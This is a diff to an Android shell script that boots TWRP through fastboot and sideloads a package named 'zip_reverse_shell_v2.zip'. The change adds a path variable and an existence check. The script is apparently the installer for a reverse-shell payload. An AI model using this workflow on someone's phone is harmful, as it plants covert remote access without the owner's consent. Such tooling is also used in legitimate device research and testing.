@@ -8,12 +8,19 @@ wfs() {
 	adb wait-for-sideload
 }
 
+TWRP_PATH=./twrp
+
 BACKUP_PATH=backup_original_partitions
 BUILD_PATH=../out
 
 ZIP_INSTALL=zip_reverse_shell_v2.zip
 
 pull_backups=1
+
+if [ ! -f "$TWRP_PATH" ]; then
+  echo "TWRP not found at '$TWRP_PATH'. Exiting."
+  exit 1
+fi
 
 if [ -d "$BACKUP_PATH" ]; then
 	echo "The 'backup_original_partitions' directory is already present."
@@ -25,7 +32,7 @@ if [ -d "$BACKUP_PATH" ]; then
 fi
 
 adb reboot bootloader
-fastboot boot twrp
+fastboot boot $TWRP_PATH
 
 #  Install
 wfr && adb shell twrp sideload
